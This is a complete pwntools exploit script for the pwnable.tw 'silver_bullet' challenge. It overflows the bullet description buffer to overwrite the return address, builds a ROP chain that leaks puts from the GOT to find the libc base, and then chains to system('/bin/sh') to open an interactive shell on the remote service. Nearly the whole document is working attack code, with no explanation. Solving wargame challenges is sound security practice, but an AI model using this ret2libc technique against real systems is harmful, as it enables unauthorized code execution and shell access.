import sys
from pwn import *




PROG = ELF("silver_bullet")
LIBC = ELF('libc_32.so.6')





##########################################################
############## Parse command line arguments ##############
##########################################################
p=remote("chall.pwnable.tw",10103)
##########################################################


def menu(option):
    p.sendlineafter('choice :', str(option))


def new(description):
    menu(1)
    p.sendafter('description of bullet :', description)
    p.recvline()


def powerup(description):
    menu(2)
    p.sendafter('another description of bullet :', description)
    p.recvline()


def beat():
    menu(3)
    p.recvuntil('Oh ! You win !!\n')


def beat_and_rop(*chain):
    n = 4 * len(chain)
    assert n < 48

    new('A' * n)
    powerup(b'U' * (48 - n))
    powerup(b'\xff' * 7 + b''.join(map(p32, chain)))

    beat()


MAIN = 0x08048954
PRINTF = 0x08048494
POP_POP_RET = 0x08048a7a # 0x08048a7a : pop edi ; pop ebp ; ret

with log.progress('Leaking libc base address') as l:
    l.status('Beating warewolf and leaking puts@got')
    beat_and_rop(PRINTF,  
                 POP_POP_RET,  
                 PROG.got['puts'],  
                 0xdeadbeef,           
                 MAIN, 
                 0xdeadbeef,
                 0xdeadbeef )

    LEAK = p.recv(4)
    LIBC_BASE = u32(LEAK) - LIBC.symbols['puts']
    l.success(hex(LIBC_BASE))

SYSTEM = LIBC_BASE + LIBC.symbols['system']
BIN_SH = LIBC_BASE + next(LIBC.search(b'/bin/sh'))

with log.progress('Executing system(/bin/sh)') as l:
    l.status('Beating warewolf and loading ropchain on stack')
    beat_and_rop(SYSTEM, 0xdeadbeef, BIN_SH, 0xdeadbeef, BIN_SH)

with log.progress('Spawing shell') as l:
    p.sendline('/bin/sh')
p.interactive()
